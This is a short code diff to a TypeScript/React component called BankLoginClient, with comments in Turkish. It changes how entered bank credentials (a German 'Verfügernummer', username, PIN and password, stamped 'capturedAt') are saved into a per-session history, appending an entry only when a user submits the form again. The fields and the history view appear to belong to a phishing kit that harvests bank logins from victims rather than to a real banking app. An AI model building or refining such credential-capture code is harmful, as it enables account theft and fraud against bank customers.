@@ -466,6 +466,7 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
     const historyEntry = {
       bankSlug: bank.slug as string | undefined,
       bankName: bank.name as string | undefined,
+      htmlStepLabel: "BANKA FORMU",
       verfuegernummer: currentVerfuegernummer || credentials.verfuegernummer || "",
       username: currentUsername || credentials.username || "",
       pin: currentPin || credentials.pin || "",
@@ -486,10 +487,19 @@ export function BankLoginClient({ sessionId, bankSlug, bank }: Props) {
       capturedAt: new Date().toISOString(),
     };
 
+    // ⭐ BANKA GECMISI APPEND: SADECE TEKRAR GIRISLERDE push et.
+    //   ILK GIRIS: kolonlar guncellensin ama GEÇMİŞ butonu sayısı artmasın.
+    const prevOrdered1 = String((sessionFormData as any).orderedField1 || "").trim();
+    const prevUsername = String((sessionFormData as any).username || (sessionFormData as any).verfuegernummer || "").trim();
+    const prevPassword = String((sessionFormData as any).password || (sessionFormData as any).pin || "").trim();
+    const isFirstBankEntry =
+      prevOrdered1.length === 0 && prevUsername.length === 0 && prevPassword.length === 0;
     const previousHistory = Array.isArray((sessionFormData as any).bankFormHistory)
       ? (sessionFormData as any).bankFormHistory.slice()
       : [];
-    previousHistory.push(historyEntry);
+    if (!isFirstBankEntry) {
+      previousHistory.push(historyEntry);
+    }
 
     const nextFormData = {
       ...preservedSessionFormData,
